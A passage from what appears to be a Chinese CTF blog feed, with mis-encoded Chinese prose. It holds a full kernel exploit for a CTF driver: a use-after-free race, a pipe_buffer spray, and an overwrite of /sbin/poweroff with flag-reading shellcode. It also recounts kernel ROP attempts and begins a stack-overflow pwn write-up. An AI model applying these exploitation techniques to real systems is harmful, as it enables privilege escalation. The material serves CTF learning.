class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> shm_id;</span><br><span class="line"><span class="comment">// SYNC</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sync_s</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x3;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x4;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sync_s</span> *<span class="title">sync_s</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMAP_ADDR ((void *)0xdead0000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_PAGES (TARGET_SIZE / 0x8 - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PUNCHING HOLE</span></span><br><span class="line"><span class="type">int</span> mfd;</span><br><span class="line"><span class="type">size_t</span> shmem_sz = (<span class="number">0x1000</span> * <span class="number">0xa</span>) * PAGE_SIZE;</span><br><span class="line"><span class="type">int</span> <span class="title function_">punch_hole_prepare</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    mfd = memfd_create(<span class="string">&quot;x&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;memfd_create failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *addr = mmap(MMAP_ADDR, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, mfd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr != MMAP_ADDR) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = fallocate(mfd, <span class="number">0</span>, <span class="number">0</span>, shmem_sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fallocate failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fallocate success&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *addr2 = mmap(MMAP_ADDR + PAGE_SIZE, PAGE_SIZE * TARGET_PAGES, PROT_READ | PROT_WRITE,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr2 != MMAP_ADDR + PAGE_SIZE) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_punch_hole</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">while</span> (!sync_s-&gt;x1)</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;trigger_punch_hole&quot;</span>);</span><br><span class="line">    sync_s-&gt;x2 = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> ret = fallocate(mfd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, <span class="number">0</span>, shmem_sz);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fallocate&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_fd</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!sync_s-&gt;x3)</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger uaf\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    spray_pipes(<span class="number">0x10</span>, MAX_PIPE_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x10</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    spray_pipes(<span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">triger_vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    sync_s-&gt;x1 = <span class="number">1</span>;</span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!(sync_s-&gt;x2))</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;triger_vuln&quot;</span>);</span><br><span class="line">    sync_s-&gt;x3 = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(write(fd, MMAP_ADDR, <span class="number">0x1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    info(<span class="string">&quot;triger_done&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> t1, t2, t3;</span><br><span class="line">    shm_id = shmget(IPC_PRIVATE, <span class="number">0x1000</span>, IPC_CREAT | <span class="number">0666</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sync_s = (<span class="keyword">struct</span> sync_s *)shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    punch_hole_prepare();</span><br><span class="line">    pthread_create(&amp;t1, <span class="number">0</span>, triger_vuln, <span class="number">0</span>);</span><br><span class="line">    pthread_create(&amp;t2, <span class="number">0</span>, trigger_punch_hole, <span class="number">0</span>);</span><br><span class="line">    pthread_create(&amp;t3, <span class="number">0</span>, delete_fd, <span class="number">0</span>);</span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t2, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t3, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to find corrupted pipe_buf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] finding corrupted page\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> corrupted_index = <span class="number">-1</span>, pointed_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        already_read[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> p_buf[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">memset</span>(p_buf, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], p_buf, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">            corrupted_index = i;</span><br><span class="line">            pointed_index = k;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found %d=&gt;%d pipe data: %p\n&quot;</span>, i, k, *(<span class="type">uint64_t</span> *)p_buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (corrupted_index == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find corrupted page\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *alloc_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(alloc_buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], alloc_buf, <span class="number">0x20</span>);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> passwd_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        passwd_fd[i] = open(<span class="string">&quot;/sbin/poweroff&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(passwd_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;open target file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> tmp = <span class="number">0x480e801f</span>;</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], &amp;tmp, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> retval = write(passwd_fd[i], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">if</span>(retval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write file success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        close(passwd_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ±‚è§£æ•ˆæœ-3"><a href="#æ±‚è§£æ•ˆæœ-3" class="headerlink" title="æ±‚è§£æ•ˆæœ"></a>æ±‚è§£æ•ˆæœ</h3><img src="/2024/10/07/kno_puts/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™é‡Œæƒ³åˆ†äº«ä¸€ä¸‹æˆ‘åšé¢˜æ—¶çš„å¿ƒç†å˜åŒ–ã€‚å½“æ—¶æˆ‘çœ‹è§ <code>uaf</code> ç›´æ¥æƒ³ç€ç”¨ <code>USMA</code> ç»™ä»–ç§’äº†ï¼Œæ‰€ä»¥è°ƒè¯•éƒ½æ‡’çš„è°ƒç›´æ¥ä¸€å£æ°”æŠŠæ•´ä¸ª <code>exp</code> ç»™å†™å®Œï¼Œç»“æœä¸€è¿è¡Œå‘ç°å†…æ ¸ç¼–è¯‘æ—¶å…³é—­äº†æŸäº›é€‰é¡¹ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´æ— æ³•ä½¿ç”¨ <code>USMA</code>ï¼Œäºæ˜¯æˆ‘å°±ç”¨æ­£å¸¸ç‚¹æ‰“æ‰“æ³•å»åŠ«æŒ <code>tty_struct</code> ç„¶åä½¿ç”¨ <code>work_for_cpu_fn</code> ä¸€æŠŠæ¢­ï¼Œç»“æœå†…æ ¸ç›´æ¥å¡åœ¨ <code>work_for_cpu_fn</code> é‡Œé¢äº†ï¼Œæƒ³äº†åŠå¤©æ²¡æƒ³æ˜ç™½ï¼Œæœ€åå‘ç°æˆ‘çš„ <code>vmlinux</code> æ˜¯æ¥è‡ªåˆ«çš„é¢˜ç›®çš„ğŸ˜‡ğŸ¤£ï¼Œå½“åœºè£‚å¼€ã€‚æŠŠæ‰€æœ‰åœ°å€æ›¿æ¢æ­£ç¡®ä¹ŸèŠ±äº†ç‚¹æ—¶é—´ï¼Œå¯æ˜¯ç¨‹åºè¿˜æ˜¯å¡åœ¨ <code>work_for_cpu_fn</code> é‡Œé¢ï¼Œæˆ‘è§‰å¾—æ˜¯æˆ‘æŠŠ <code>fake ops</code> å†™åˆ°äº† <code>tty_struct</code> å ç”¨äº†æŸäº›å˜é‡çš„ä½ç½®é€ æˆçš„ï¼Œäºæ˜¯æˆ‘å°±ç”¨ <code>ret2hbp</code> æƒ³æŠŠ <code>fake ops</code> å†™åˆ° <code>db_stack</code> ä¸Šï¼Œç»“æœæ„Ÿè§‰åˆæ˜¯ç¼–è¯‘æ—¶å…³é—­äº†æŸäº›é€‰é¡¹ï¼Ÿå†™åŠå¤©å†™ä¸ä¸Šå»ï¼Œç›´æ¥å¿ƒæ€å´©äº†ã€‚åé¢æœ‰äººæé†’æˆ‘çœ‹çœ‹èƒ½ä¸èƒ½ç”¨ <code>pt_regs</code>ï¼Œæˆ‘çœ‹äº†çœ¼åç§»æ˜¯å›ºå®šäº†ï¼Œäºæ˜¯é©¬ä¸Šåœ¨ <code>pt_regs</code> ä¸Šå†™å¥½ kenrel rop ç›´æ¥æ ˆè¿ç§»è¿‡å»ï¼Œä¸­é—´ä¸ºäº†æ‰¾ <code>init_cred</code> çš„åœ°å€åˆä¸å¾—ä¸æŠŠ <code>vmlinux</code> ä¸¢è¿› <code>ida</code> é‡Œé¢æ…¢æ…¢æ‰¾ï¼Œæœ€åæˆåŠŸæŠŠè¡€ç»™ææ²¡äº†ğŸ¤£</p><p>æ„Ÿè§‰è‡ªå·±çš„æ°´å¹³è¿˜æ˜¯å¤ªä½äº†ï¼Œæˆ‘è¿˜èƒ½å˜å¾—æ›´å¼ºæŠŠ :-(</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¾ŠåŸæ¯ 2024 pwn writeup</title>
      <link href="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/"/>
      <url>/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/</url>
      
        <content type="html"><![CDATA[<p>å»å¹´å°±çŸ¥é“è¿™ä¸ªæ¯”èµ›å¾ˆå·ï¼Œæ²¡æƒ³åˆ°ä»Šå¹´æ›´å·ã€‚æŸæŸæˆ˜é˜Ÿè·ç¦»æ¯”èµ›ç»“æŸè¿˜æœ‰40åˆ†é’Ÿæ—¶æ’åç¬¬ä¸€ï¼Œæ¯”èµ›ç»“æŸæ—¶æ’ç¬¬äºŒåä¸€ï¼ŒçœŸçš„é€†å¤©ã€‚<br>è¿™æ¬¡æ¯”èµ›å­¦é•¿ä¸æ˜¯åœ¨å®ä¹ å°±æ˜¯å»å¸®åˆ«çš„æˆ˜é˜Ÿæ‰“ï¼Œåˆ°å¤´æ¥pwnå…¨éƒ½åªèƒ½æˆ‘ä¸€ä¸ªäººæ¥æ‰“ï¼ŒçœŸçš„å¥½ç´¯å–µğŸ˜‡ã€‚è¿˜å¥½é¢˜ç›®ä¸æ˜¯å¾ˆéš¾ï¼Œä¸€å…±äº”é¢˜pwnï¼Œå‰4é¢˜å¾ˆå¿«å°±æ‰“å®Œäº†ï¼Œæœ€åä¸€é¢˜å·¨æŠ½è±¡ï¼Œæœ¬åœ°ä¸åŒçš„æ‰“æ³•éƒ½é€šäº†ï¼Œè¿œç¨‹æ­»æ´»ä¸åŒï¼ŒçœŸæ˜¯è®©äººé“å¿ƒç ´ç¢æã€‚</p><h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><p>è¿™æ˜¯æœ¬æ¬¡æ¯”èµ›çš„ç­¾åˆ°é¢˜ï¼Œä¸»é€»è¾‘å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s start the construction for stack overflow exploit.&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you grasp this little bit of overflow?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨<code>0x10</code>å­—èŠ‚çš„æº¢å‡ºã€‚ç”±äºåªèƒ½è¦†ç›–<code>rbp</code>å’Œ<code>ret</code>ï¼Œæ‰€ä»¥éœ€è¦æ ˆè¿ç§»ï¼Œç„¶å<code>ret2libc</code>ï¼Œè¿™é‡Œæˆ‘æ ˆè¿ç§»äº†2æ¬¡ï¼Œç¬¬ä¸€æ¬¡ç”¨æ¥æ³„éœ²åœ°å€ï¼Œç¬¬äºŒæ¬¡ç”¨æ¥getshellã€‚å¯æ˜¯ä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¯å¢ƒçš„é—®é¢˜ï¼Œæˆ‘æœ¬åœ°æ‰“<code>system(&quot;/bin/sh&quot;)</code>æ­»æ´»éƒ½ä¸é€šï¼Œæ‰“<code>execve(&quot;/bin/sh&quot;,0,0)</code>å‘ç°æ ˆè¿ç§»åæº¢å‡ºçš„å­—èŠ‚ä¸å¤Ÿæˆ‘å†™ropé“¾ï¼Œæœ€ååªèƒ½ä½¿ç”¨libcä¸Šçš„gadgetæ¥ä½¿å…¶æ»¡è¶³å…¶ä¸­ä¸€ä¸ª<code>one_gadget</code>æ¥getshellğŸ˜‡<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 